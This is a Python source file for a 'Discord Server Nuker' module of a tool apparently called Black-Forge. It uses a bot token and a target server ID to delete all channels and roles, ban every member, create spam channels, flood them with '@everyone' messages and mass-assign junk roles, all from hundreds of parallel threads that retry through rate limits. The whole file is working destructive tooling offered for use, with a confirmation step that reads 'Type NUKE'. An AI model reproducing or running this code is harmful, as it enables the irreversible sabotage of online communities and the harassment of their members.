import os
import sys
import time
import json
import threading
import requests
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from ui import BlackforgeUI as TerminalUI, R1, R2, BORDER, WHITE, MUTED, SUCCESS, WARNING, DANGER, RESET, center_text

ROOT_DIR    = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SETUP_DIR   = os.path.join(ROOT_DIR, "setup")
CONFIG_PATH = os.path.join(SETUP_DIR, "config.json")

DISCORD_BASE = "https://discord.com/api/v10"

DELETE_WORKERS     = 256
MSG_WORKERS        = 128
BAN_WORKERS        = 128
ROLE_BLAST_WORKERS = 256
MAX_RETRIES        = 12


def _load_config() -> Dict[str, str]:
    default = {"BOT_TOKEN": "", "CLIENT_ID": "", "CLIENT_SECRET": ""}
    if not os.path.exists(CONFIG_PATH):
        return default
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        return {
            "BOT_TOKEN":     str(data.get("BOT_TOKEN",     "")).strip(),
            "CLIENT_ID":     str(data.get("CLIENT_ID",     "")).strip(),
            "CLIENT_SECRET": str(data.get("CLIENT_SECRET", "")).strip(),
        }
    except Exception:
        return default


def _make_session(token: str) -> requests.Session:
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=512,
        pool_maxsize=512,
        max_retries=0,
    )
    s.mount("https://", adapter)
    s.mount("http://",  adapter)
    s.headers.update({
        "Authorization":         f"Bot {token}",
        "Content-Type":          "application/json",
        "User-Agent":            "DiscordBot (https://discord.com, 10)",
        "X-RateLimit-Precision": "millisecond",
    })
    return s


def _rl_wait(r: requests.Response) -> float:
    try:
        ra = r.json().get("retry_after", 0)
        return float(ra) + 0.05
    except Exception:
        return 1.0


def _req_with_rl(fn, max_retries: int = MAX_RETRIES) -> Tuple[Optional[requests.Response], int]:
    for _ in range(max_retries):
        try:
            r = fn()
            if r.status_code == 429:
                wait = _rl_wait(r)
                time.sleep(wait)
                continue
            return r, r.status_code
        except Exception:
            time.sleep(0.2)
    return None, 0


def _verify_bot(session: requests.Session) -> Tuple[bool, str, str]:
    try:
        r = session.get(f"{DISCORD_BASE}/users/@me", timeout=6)
        if r.status_code == 200:
            d = r.json()
            return True, f"{d.get('username')}#{d.get('discriminator','0')}", d.get("id", "")
        return False, f"HTTP {r.status_code}", ""
    except Exception as e:
        return False, str(e), ""


def _verify_guild(session: requests.Session, guild_id: str) -> Tuple[bool, str]:
    try:
        r = session.get(f"{DISCORD_BASE}/guilds/{guild_id}", timeout=6)
        if r.status_code == 200:
            return True, r.json().get("name", guild_id)
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)


def _get_channels(session: requests.Session, guild_id: str) -> List[Dict]:
    try:
        r = session.get(f"{DISCORD_BASE}/guilds/{guild_id}/channels", timeout=6)
        return r.json() if r.status_code == 200 else []
    except Exception:
        return []


def _get_roles(session: requests.Session, guild_id: str) -> List[Dict]:
    try:
        r = session.get(f"{DISCORD_BASE}/guilds/{guild_id}/roles", timeout=6)
        data = r.json() if r.status_code == 200 else []
        return [x for x in data if not x.get("managed") and x.get("name") != "@everyone"]
    except Exception:
        return []


def _get_members(session: requests.Session, guild_id: str) -> List[Dict]:
    members: List[Dict] = []
    after = "0"
    while True:
        try:
            r = session.get(
                f"{DISCORD_BASE}/guilds/{guild_id}/members",
                params={"limit": 1000, "after": after},
                timeout=8,
            )
            if r.status_code != 200:
                break
            batch = r.json()
            if not batch:
                break
            members.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000:
                break
        except Exception:
            break
    return members


def _counter():
    lock  = threading.Lock()
    state = {"ok": 0, "fail": 0}

    def inc(ok: bool):
        with lock:
            if ok:
                state["ok"] += 1
            else:
                state["fail"] += 1

    def get() -> Tuple[int, int]:
        with lock:
            return state["ok"], state["fail"]

    return inc, get


def _run_delete_channels(session: requests.Session, guild_id: str, inc, log_fn):
    channels = _get_channels(session, guild_id)
    if not channels:
        log_fn(f"{MUTED}  [CH] No channels found.{RESET}")
        return

    log_fn(f"{R1}  [CH] Wiping {WHITE}{len(channels)}{R1} channel(s)...{RESET}")

    def worker(ch: Dict):
        ch_id   = ch.get("id", "?")
        ch_name = ch.get("name", "?")
        kind    = "CAT" if ch.get("type") == 4 else "CH "
        r, status = _req_with_rl(lambda: session.delete(f"{DISCORD_BASE}/channels/{ch_id}", timeout=5))
        ok = status in (200, 204)
        inc(ok)
        lbl = f"{SUCCESS}DEL{RESET}" if ok else f"{DANGER}ERR {status}{RESET}"
        log_fn(f"{R2 if ok else DANGER}{'✔' if ok else '✗'} {RESET}{MUTED}[{kind}]{RESET} {WHITE}#{ch_name:<24}{RESET} {lbl}")

    with ThreadPoolExecutor(max_workers=DELETE_WORKERS) as pool:
        list(as_completed([pool.submit(worker, ch) for ch in channels]))


def _run_delete_roles(session: requests.Session, guild_id: str, inc, log_fn):
    roles = _get_roles(session, guild_id)
    if not roles:
        log_fn(f"{MUTED}  [RL] No deletable roles.{RESET}")
        return

    log_fn(f"{R1}  [RL] Wiping {WHITE}{len(roles)}{R1} role(s)...{RESET}")

    def worker(role: Dict):
        rid   = role.get("id", "?")
        rname = role.get("name", "?")
        r, status = _req_with_rl(lambda: session.delete(f"{DISCORD_BASE}/guilds/{guild_id}/roles/{rid}", timeout=5))
        ok = status == 204
        inc(ok)
        lbl = f"{SUCCESS}DEL{RESET}" if ok else f"{DANGER}ERR {status}{RESET}"
        log_fn(f"{R2 if ok else DANGER}{'✔' if ok else '✗'} {RESET}{MUTED}[RL]{RESET} {WHITE}@{rname:<24}{RESET} {lbl}")

    with ThreadPoolExecutor(max_workers=DELETE_WORKERS) as pool:
        list(as_completed([pool.submit(worker, r) for r in roles]))


def _run_ban_members(session: requests.Session, guild_id: str, bot_id: str, inc, log_fn):
    log_fn(f"{R1}  [BN] Fetching members...{RESET}")
    members = _get_members(session, guild_id)
    targets = [m for m in members if m["user"]["id"] != bot_id]
    if not targets:
        log_fn(f"{MUTED}  [BN] No members to ban.{RESET}")
        return

    log_fn(f"{R1}  [BN] Banning {WHITE}{len(targets)}{R1} member(s)...{RESET}")

    def worker(member: Dict):
        user  = member["user"]
        uid   = user["id"]
        uname = f"{user.get('username','?')}#{user.get('discriminator','0')}"
        r, status = _req_with_rl(
            lambda: session.put(
                f"{DISCORD_BASE}/guilds/{guild_id}/bans/{uid}",
                json={"delete_message_seconds": 0},
                timeout=5,
            )
        )
        ok = status in (200, 204)
        inc(ok)
        lbl = f"{SUCCESS}BAN{RESET}" if ok else f"{DANGER}ERR {status}{RESET}"
        log_fn(f"{R2 if ok else DANGER}{'✔' if ok else '✗'} {RESET}{MUTED}[BN]{RESET} {WHITE}{uname:<24}{RESET} {lbl}")

    with ThreadPoolExecutor(max_workers=BAN_WORKERS) as pool:
        list(as_completed([pool.submit(worker, m) for m in targets]))


def _run_create_channels(session: requests.Session, guild_id: str, name: str, count: int, log_fn) -> List[str]:
    log_fn(f"{R1}  [CR] Creating {WHITE}{count}{R1}x {WHITE}#{name}{R1}...{RESET}")
    created: List[str] = []
    lock = threading.Lock()

    def worker(_: int):
        r, status = _req_with_rl(
            lambda: session.post(
                f"{DISCORD_BASE}/guilds/{guild_id}/channels",
                json={"name": name, "type": 0},
                timeout=6,
            )
        )
        ch_id = r.json().get("id") if r and status in (200, 201) else None
        if ch_id:
            with lock:
                created.append(ch_id)
            log_fn(f"{R2}✔ {RESET}{MUTED}[CR]{RESET} {WHITE}#{name:<24}{RESET} {SUCCESS}CREATED {MUTED}({ch_id}){RESET}")
        else:
            log_fn(f"{DANGER}✗ {RESET}{MUTED}[CR]{RESET} {WHITE}#{name:<24}{RESET} {DANGER}FAILED{RESET}")

    with ThreadPoolExecutor(max_workers=min(count, 50)) as pool:
        list(as_completed([pool.submit(worker, i) for i in range(count)]))

    return created


def _run_blast_messages(session: requests.Session, channel_ids: List[str], message: str, msg_count: int, log_fn):
    tasks = [(ch_id, i) for ch_id in channel_ids for i in range(1, msg_count + 1)]
    log_fn(f"{R1}  [MS] Blasting {WHITE}{msg_count}{R1}msg × {WHITE}{len(channel_ids)}{R1}ch = {WHITE}{len(tasks)}{R1} total...{RESET}")

    inc, get = _counter()

    def worker(ch_id: str, seq: int):
        r, status = _req_with_rl(
            lambda: session.post(
                f"{DISCORD_BASE}/channels/{ch_id}/messages",
                json={"content": message},
                timeout=5,
            )
        )
        ok = status in (200, 201)
        inc(ok)
        lbl = f"{SUCCESS}SENT{RESET}" if ok else f"{DANGER}FAIL({status}){RESET}"
        log_fn(f"{R2 if ok else DANGER}{'✔' if ok else '✗'} {RESET}{MUTED}[MS] CH:{ch_id:<20}{RESET} #{seq:<4} {lbl}")

    with ThreadPoolExecutor(max_workers=MSG_WORKERS) as pool:
        list(as_completed([pool.submit(worker, ch_id, seq) for ch_id, seq in tasks]))

    ok_n, fail_n = get()
    log_fn(f"{R2}✔ {ok_n} Sent{RESET}  {BORDER}│{RESET}  {DANGER}✗ {fail_n} Failed{RESET}")


def _run_blast_roles(
    session: requests.Session,
    guild_id: str,
    role_name: str,
    role_count: int,
    inc,
    log_fn,
):
    log_fn(f"{R1}  [BR] Creating {WHITE}{role_count}{R1} role(s) named {WHITE}{role_name}{R1}...{RESET}")

    created_roles: List[str] = []
    create_lock = threading.Lock()

    def create_worker(_: int):
        r, status = _req_with_rl(
            lambda: session.post(
                f"{DISCORD_BASE}/guilds/{guild_id}/roles",
                json={"name": role_name, "color": 16711680, "mentionable": True},
                timeout=6,
            )
        )
        if r and status in (200, 201):
            rid = r.json().get("id")
            if rid:
                with create_lock:
                    created_roles.append(rid)
                log_fn(f"{R2}✔ {RESET}{MUTED}[BR]{RESET} {WHITE}@{role_name:<24}{RESET} {SUCCESS}CREATED {MUTED}({rid}){RESET}")
                return
        log_fn(f"{DANGER}✗ {RESET}{MUTED}[BR]{RESET} {WHITE}@{role_name:<24}{RESET} {DANGER}FAILED (HTTP {status}){RESET}")

    with ThreadPoolExecutor(max_workers=min(role_count, 50)) as pool:
        list(as_completed([pool.submit(create_worker, i) for i in range(role_count)]))

    if not created_roles:
        log_fn(f"{DANGER}  [BR] No roles created — assignment skipped.{RESET}")
        return

    log_fn(f"{R1}  [BR] Fetching members for role assignment...{RESET}")
    members = _get_members(session, guild_id)
    if not members:
        log_fn(f"{MUTED}  [BR] No members found for assignment.{RESET}")
        return

    tasks: List[Tuple[str, str]] = [
        (uid, rid)
        for m in members
        for uid in [m["user"]["id"]]
        for rid in created_roles
    ]

    log_fn(
        f"{R1}  [BR] Assigning {WHITE}{len(created_roles)}{R1} role(s) × "
        f"{WHITE}{len(members)}{R1} member(s) = {WHITE}{len(tasks)}{R1} total ops...{RESET}"
    )

    def assign_worker(uid: str, rid: str):
        r, status = _req_with_rl(
            lambda: session.put(
                f"{DISCORD_BASE}/guilds/{guild_id}/members/{uid}/roles/{rid}",
                timeout=5,
            )
        )
        ok = status == 204
        inc(ok)
        lbl = f"{SUCCESS}ASSIGNED{RESET}" if ok else f"{DANGER}FAIL({status}){RESET}"
        log_fn(f"{R2 if ok else DANGER}{'✔' if ok else '✗'} {RESET}{MUTED}[BR] UID:{uid:<22}{RESET} RID:{rid:<22} {lbl}")

    with ThreadPoolExecutor(max_workers=ROLE_BLAST_WORKERS) as pool:
        list(as_completed([pool.submit(assign_worker, uid, rid) for uid, rid in tasks]))


def _prompt(label: str) -> str:
    pl = center_text(f"{BORDER}╭──────────[ {R1}{label}{RESET}{BORDER} ]──────────╮{RESET}")
    sp = center_text(f"{BORDER}╰─────[ {R2}❯❯{RESET}{BORDER} ]{RESET} ")
    print(pl)
    try:
        return input(sp).strip()
    except (KeyboardInterrupt, EOFError):
        return ""


def _prompt_int(label: str, default: int, lo: int = 1, hi: int = 500) -> int:
    raw = _prompt(f"{label} (default {default})")
    if not raw:
        return default
    try:
        return max(lo, min(hi, int(raw)))
    except ValueError:
        return default


def run_nuker(auth_data: Optional[Dict] = None):
    config    = _load_config()
    bot_token = config["BOT_TOKEN"]
    session   = _make_session(bot_token)

    while True:
        TerminalUI.render_banner("Discord Server Nuker")

        bot_ok, bot_info, bot_user_id = _verify_bot(session)

        print(TerminalUI.b_top("Status"))
        print(TerminalUI.b_row())

        if auth_data:
            usr = auth_data.get("username", "User")
            exp = auth_data.get("expiry") or "Lifetime"
            print(TerminalUI.b_row(f"{R1}Account  {BORDER}│ {WHITE}{usr}{RESET} {BORDER}• Expiry: {R2}{exp}{RESET}"))

        bstr = (
            f"{R2}● Online  {RESET}{WHITE}{bot_info}{RESET}"
            if bot_ok else
            f"{MUTED}● Offline {RESET}{DANGER}{bot_info}{RESET}"
        )
        print(TerminalUI.b_row(f"{R1}Bot      {BORDER}│ {bstr}"))
        print(TerminalUI.b_row(
            f"{R1}Engine   {BORDER}│ {WHITE}{DELETE_WORKERS} DELETE / {BAN_WORKERS} BAN / {MSG_WORKERS} MSG workers{RESET}"
            f"  {MUTED}│{RESET}  {R2}ALL PHASES PARALLEL{RESET}"
        ))

        print(TerminalUI.b_row())
        print(TerminalUI.b_div("Options"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_row(f"  {BORDER}╭──[{R2} 1 {BORDER}]──{RESET} {WHITE}Setup & Launch Nuke{RESET}   {MUTED}─── Full config then execute{RESET}"))
        print(TerminalUI.b_row(f"  {BORDER}╭──[{R2} 2 {BORDER}]──{RESET} {WHITE}Back to Main Menu{RESET}     {MUTED}─── Return to Black-Forge{RESET}"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_bottom())
        print()

        cmd = _prompt("Choose Option")
        if cmd == "2" or cmd == "":
            break
        if cmd != "1":
            print(f"\n{center_text(f'{WARNING}Please enter 1 or 2.{RESET}')}\n")
            time.sleep(0.4)
            continue
        if not bot_ok:
            TerminalUI.render_banner("Discord Server Nuker")
            print(center_text(f"{DANGER}Bot token invalid / missing in setup/config.json{RESET}\n"))
            input(center_text(f"{MUTED}Press Enter to continue...{RESET}"))
            continue

        TerminalUI.render_banner("Discord Server Nuker")

        print(TerminalUI.b_top("Setup — Target"))
        print(TerminalUI.b_row(f"{R1}Enter the Guild ID (Server ID) to nuke{RESET}"))
        print(TerminalUI.b_bottom())
        print()

        guild_id = _prompt("Guild ID")
        if not guild_id:
            continue

        TerminalUI.render_banner("Discord Server Nuker")
        print(center_text(f"{R2}Verifying guild...{RESET}\n"))
        guild_ok, guild_name = _verify_guild(session, guild_id)

        if not guild_ok:
            print(center_text(f"{DANGER}Guild unreachable — {guild_name}{RESET}\n"))
            input(center_text(f"{MUTED}Press Enter to continue...{RESET}"))
            continue

        print(center_text(f"{SUCCESS}✔ Guild: {WHITE}{guild_name}{RESET}\n"))
        time.sleep(0.4)

        TerminalUI.render_banner("Discord Server Nuker")
        print(TerminalUI.b_top("Setup — Actions"))
        print(TerminalUI.b_row(f"{MUTED}Toggle each action (y/n){RESET}"))
        print(TerminalUI.b_bottom())
        print()

        do_del_channels = _prompt("Delete ALL channels & categories? (y/n)").lower() in ("y", "yes")
        do_del_roles    = _prompt("Delete ALL roles? (y/n)").lower() in ("y", "yes")
        do_ban_members  = _prompt("Ban ALL members? (y/n)").lower() in ("y", "yes")
        do_create_ch    = _prompt("Create new channels? (y/n)").lower() in ("y", "yes")
        do_blast_roles  = _prompt("Blast roles onto all members? (y/n)").lower() in ("y", "yes")

        channel_name  = ""
        channel_count = 0
        blast_message = ""
        msg_count     = 0
        do_blast      = False
        role_blast_name  = ""
        role_blast_count = 0

        if do_create_ch:
            TerminalUI.render_banner("Discord Server Nuker")
            print(TerminalUI.b_top("Setup — Channel Creation"))
            print(TerminalUI.b_bottom())
            print()

            raw_name     = _prompt("Channel name")
            channel_name  = (raw_name.lower().replace(" ", "-") if raw_name else "nuked")
            channel_count = _prompt_int("How many channels to create?", 3, 1, 50)
            do_blast      = _prompt("Blast messages? (y/n)").lower() in ("y", "yes")

            if do_blast:
                TerminalUI.render_banner("Discord Server Nuker")
                print(TerminalUI.b_top("Setup — Message Blast"))
                print(TerminalUI.b_bottom())
                print()

                raw_msg       = _prompt("Message to blast")
                blast_message = raw_msg if raw_msg else "@everyone nuked"
                msg_count     = _prompt_int("Messages per channel?", 10, 1, 500)

        if do_blast_roles:
            TerminalUI.render_banner("Discord Server Nuker")
            print(TerminalUI.b_top("Setup — Role Blast"))
            print(TerminalUI.b_row(f"{MUTED}Creates N roles then assigns them to every member simultaneously{RESET}"))
            print(TerminalUI.b_bottom())
            print()

            raw_rname        = _prompt("Role name to blast")
            role_blast_name  = raw_rname if raw_rname else "nuked"
            role_blast_count = _prompt_int("How many roles to create?", 5, 1, 250)

        TerminalUI.render_banner("Discord Server Nuker")

        print(TerminalUI.b_top("Nuke Configuration — Review"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_row(f"{R1}Target   {BORDER}│ {WHITE}{guild_name}{RESET}  {MUTED}({guild_id}){RESET}"))
        print(TerminalUI.b_row(f"{R1}Bot      {BORDER}│ {WHITE}{bot_info}{RESET}"))
        print(TerminalUI.b_div())
        print(TerminalUI.b_row(f"{R1}Del Channels {BORDER}│  {'  '+R2+'YES'+RESET if do_del_channels else MUTED+'NO '+RESET}"))
        print(TerminalUI.b_row(f"{R1}Del Roles    {BORDER}│  {'  '+R2+'YES'+RESET if do_del_roles else MUTED+'NO '+RESET}"))
        print(TerminalUI.b_row(f"{R1}Ban Members  {BORDER}│  {'  '+R2+'YES'+RESET if do_ban_members else MUTED+'NO '+RESET}"))

        if do_create_ch:
            print(TerminalUI.b_row(f"{R1}Create CH    {BORDER}│  {R2}{channel_count}x {WHITE}#{channel_name}{RESET}"))
        else:
            print(TerminalUI.b_row(f"{R1}Create CH    {BORDER}│  {MUTED}NO{RESET}"))

        if do_blast:
            print(TerminalUI.b_row(f"{R1}Blast Msgs   {BORDER}│  {R2}{msg_count}/ch{RESET}  {MUTED}→ {WHITE}{blast_message[:38]}{RESET}"))
        else:
            print(TerminalUI.b_row(f"{R1}Blast Msgs   {BORDER}│  {MUTED}NO{RESET}"))

        if do_blast_roles:
            print(TerminalUI.b_row(f"{R1}Blast Roles  {BORDER}│  {R2}{role_blast_count}x {WHITE}@{role_blast_name}{RESET}  {MUTED}→ assigned to ALL members{RESET}"))
        else:
            print(TerminalUI.b_row(f"{R1}Blast Roles  {BORDER}│  {MUTED}NO{RESET}"))

        print(TerminalUI.b_row())
        print(TerminalUI.b_row(f"{DANGER}  ⚡ All destructive phases fire SIMULTANEOUSLY{RESET}"))
        print(TerminalUI.b_row(f"{DANGER}  ⚠ IRREVERSIBLE — server will be obliterated{RESET}"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_bottom())
        print()

        confirm = _prompt("Type NUKE to confirm and launch")
        if confirm.upper() != "NUKE":
            print(f"\n{center_text(f'{WARNING}⚠ Aborted — server was not touched.{RESET}')}\n")
            input(center_text(f"{MUTED}Press Enter to continue...{RESET}"))
            continue

        TerminalUI.render_banner("Discord Server Nuker")
        print(TerminalUI.b_top("NUKE LAUNCHED — All phases running simultaneously"))
        print(TerminalUI.b_div())

        t_start = time.time()

        ch_inc, ch_get   = _counter()
        rl_inc, rl_get   = _counter()
        bn_inc, bn_get   = _counter()
        br_inc, br_get   = _counter()

        created_ids: List[str] = []
        create_done  = threading.Event()
        created_lock = threading.Lock()

        def log(msg: str):
            TerminalUI.log(msg)

        destruction_threads: List[threading.Thread] = []

        if do_del_channels:
            t = threading.Thread(
                target=_run_delete_channels,
                args=(session, guild_id, ch_inc, log),
                daemon=True,
            )
            destruction_threads.append(t)

        if do_del_roles:
            t = threading.Thread(
                target=_run_delete_roles,
                args=(session, guild_id, rl_inc, log),
                daemon=True,
            )
            destruction_threads.append(t)

        if do_ban_members:
            t = threading.Thread(
                target=_run_ban_members,
                args=(session, guild_id, bot_user_id, bn_inc, log),
                daemon=True,
            )
            destruction_threads.append(t)

        if do_create_ch:
            def create_then_blast():
                ids = _run_create_channels(session, guild_id, channel_name, channel_count, log)
                with created_lock:
                    created_ids.extend(ids)
                create_done.set()
                if do_blast and ids:
                    _run_blast_messages(session, ids, blast_message, msg_count, log)

            t = threading.Thread(target=create_then_blast, daemon=True)
            destruction_threads.append(t)

        if do_blast_roles:
            t = threading.Thread(
                target=_run_blast_roles,
                args=(session, guild_id, role_blast_name, role_blast_count, br_inc, log),
                daemon=True,
            )
            destruction_threads.append(t)

        for t in destruction_threads:
            t.start()

        for t in destruction_threads:
            t.join()

        elapsed = time.time() - t_start

        print(TerminalUI.b_div())

        if do_del_channels:
            ok_n, fail_n = ch_get()
            print(TerminalUI.b_row(f"{R1}Channels   {BORDER}│ {R2}✔ {ok_n} Deleted{RESET}  {BORDER}│{RESET}  {DANGER}✗ {fail_n} Failed{RESET}"))

        if do_del_roles:
            ok_n, fail_n = rl_get()
            print(TerminalUI.b_row(f"{R1}Roles      {BORDER}│ {R2}✔ {ok_n} Deleted{RESET}  {BORDER}│{RESET}  {DANGER}✗ {fail_n} Failed{RESET}"))

        if do_ban_members:
            ok_n, fail_n = bn_get()
            print(TerminalUI.b_row(f"{R1}Bans       {BORDER}│ {R2}✔ {ok_n} Banned{RESET}   {BORDER}│{RESET}  {DANGER}✗ {fail_n} Failed{RESET}"))

        if do_blast_roles:
            ok_n, fail_n = br_get()
            print(TerminalUI.b_row(f"{R1}Role Blast {BORDER}│ {R2}✔ {ok_n} Assigned{RESET} {BORDER}│{RESET}  {DANGER}✗ {fail_n} Failed{RESET}"))

        print(TerminalUI.b_row())
        print(TerminalUI.b_row(f"{R2}✔ {WHITE}{guild_name}{RESET} has been obliterated in {R2}{elapsed:.2f}s{RESET}"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_bottom())
        print()

        input(center_text(f"{MUTED}Press Enter to go back...{RESET}"))
